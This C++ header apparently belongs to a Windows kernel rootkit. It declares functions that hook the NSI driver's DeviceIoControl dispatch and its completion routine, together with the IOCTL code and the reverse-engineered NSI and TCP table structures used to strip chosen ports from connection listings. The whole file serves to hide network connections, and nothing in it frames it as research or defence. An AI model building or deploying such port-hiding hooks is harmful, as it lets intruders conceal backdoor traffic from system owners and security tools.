#pragma once
#include <ntifs.h>
#include "FastMutex.h"
#include "AutoLock.h"

namespace NetworkHandler {
	NTSTATUS hookNsi();

	NTSTATUS unhookNsi();

	NTSTATUS hookedDeviceIoControl(PDEVICE_OBJECT  DeviceObject, PIRP  Irp);

	NTSTATUS hookedCompletionRoutine(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context);

	USHORT htons(USHORT a);

	void addHiddenPort(LIST_ENTRY* entry);

	void cleanHiddenPorts();

	bool shouldHidePort(USHORT port);

	extern "C" NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
		PUNICODE_STRING ObjectName,
		ULONG Attributes,
		PACCESS_STATE AccessState,
		ACCESS_MASK DesiredAccess,
		POBJECT_TYPE ObjectType,
		KPROCESSOR_MODE AccessMode,
		PVOID ParseContext OPTIONAL,
		PVOID * Object
	);

	extern "C" POBJECT_TYPE * IoDriverObjectType;

	extern PDRIVER_OBJECT pNsiDriverObject;
	extern PDRIVER_DISPATCH originalNsiDeviceIo;

	struct HiddenPort
	{
		LIST_ENTRY Entry;
		USHORT HiddenPort;
	};

	typedef struct _HIDDEN_PORTS {
		LIST_ENTRY HiddenPortsHead;
		int HiddenPortsCount;
		FastMutex Mutex;
	} HIDDEN_PORTS, *PHIDDERN_PORTS;

	extern HIDDEN_PORTS HiddenPortsContext;

	constexpr int MAX_HIDDEN_PORTS = 256;

	constexpr ULONG  IOCTL_NSI_GETALLPARAM = 0x12001B;

	typedef unsigned long DWORD;

	typedef struct _NSI_STATUS_ENTRY
	{
		char bytesfill[12];

	} NSI_STATUS_ENTRY, * PNSI_STATUS_ENTRY;

	typedef struct _NSI_PARAM
	{

		DWORD UnknownParam1;
		DWORD UnknownParam2;
		DWORD UnknownParam3;
		DWORD UnknownParam4;
		DWORD UnknownParam5;
		DWORD UnknownParam6;
		PVOID lpMem;
		DWORD UnknownParam8;
		DWORD UnknownParam9;
		DWORD UnknownParam10;
		PNSI_STATUS_ENTRY lpStatus;
		DWORD UnknownParam12;
		DWORD UnknownParam13;
		DWORD UnknownParam14;
		DWORD TcpConnectionCount;


	} NSI_PARAM, * PNSI_PARAM;

	typedef struct _HP_CONTEXT
	{
		PIO_COMPLETION_ROUTINE oldIocomplete;
		PVOID oldCtx;
		BOOLEAN bShouldInvolve;
		PKPROCESS pcb;
	} HP_CONTEXT, * PHP_CONTEXT;

	typedef struct _INTERNAL_TCP_TABLE_SUBENTRY
	{
		char bytesfill0[2];
		USHORT Port;
		DWORD dwIP;
		char bytesfill[20];

	} INTERNAL_TCP_TABLE_SUBENTRY, * PINTERNAL_TCP_TABLE_SUBENTRY;

	typedef struct _INTERNAL_TCP_TABLE_ENTRY
	{
		INTERNAL_TCP_TABLE_SUBENTRY localEntry;
		INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;
	} INTERNAL_TCP_TABLE_ENTRY, * PINTERNAL_TCP_TABLE_ENTRY;

}